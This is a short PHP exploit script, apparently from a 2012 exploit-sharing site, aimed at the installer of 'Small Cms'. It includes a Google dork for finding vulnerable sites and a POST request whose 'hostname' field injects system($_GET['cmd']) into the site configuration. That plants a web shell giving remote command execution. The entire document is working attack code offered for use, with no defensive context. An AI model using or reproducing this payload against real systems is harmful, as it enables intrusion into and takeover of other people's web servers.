<?php
# Author : L3b-r1'z
# Title : Small Cms Php Code Injection
# Date : 5/25/2012
# Email : L3b-r1z@hotmail.com
# Site : Sec4Ever.Com & Exploit4Arab.Com
# Google Dork : allintext: "Copyright © 2012 . Small-Cms "
# -------- Put Target As site.com Just (site.com) -------- #
$target = $argv[1];
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_URL, "http://$target/install.php?
step=2&action=w");
curl_setopt($ch, CURLOPT_HTTPGET, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01;
Windows NT 5.0)");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,
"hostname=LOL%22%3B%3F%3E%3C%3Fsystem(%24_GET%5B'cmd'%5D)%3B%3F%3E%3C%3F%22LOL&username=sssss&password=sssss&database=sssss");
curl_setopt($ch, CURLOPT_TIMEOUT, 3);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 3);
curl_setopt($ch, CURLOPT_LOW_SPEED_TIME, 3);
curl_setopt($ch, CURLOPT_COOKIEJAR, "/tmp/cookie_$target");
$buf = curl_exec ($ch);
curl_close($ch);
unset($ch);
echo $buf;
# Curl By : RipS
?>
